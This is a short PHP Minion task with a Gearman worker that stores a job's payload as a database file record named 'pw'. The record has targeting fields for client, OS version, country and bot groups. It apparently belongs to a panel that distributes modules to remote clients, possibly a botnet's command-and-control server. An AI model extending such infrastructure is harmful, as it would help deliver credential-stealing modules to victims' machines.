<?php defined('SYSPATH') or die('No direct script access.');

class Task_OwlDll extends Minion_Task{

    protected function _execute(array $params){
        Task_Helper::createWorker('OwlDll', $this, 'Worker', 1);
    }

    public function Worker(GearmanJob $job){
        $data = [
            'client_id' => 0,
            'priority' => 220,
            'sys_ver' => '*',
            'country' => '*',
            'importance_low' => 0,
            'importance_high' => 94,
            'userdefined_low' => 0,
            'userdefined_high' => 100,
            'filename' => 'pw',
            'group_include' => '{}',
            'group_exclude' => '{}',
            'data' => $job->workload(),
        ];

        $record = ORM::factory('File', ['filename' => 'pw']);

        if($record->loaded()){
            $record->set('data', $data['data']);
        }else{
            $record->values($data);
        }

        $record->save();
    }
}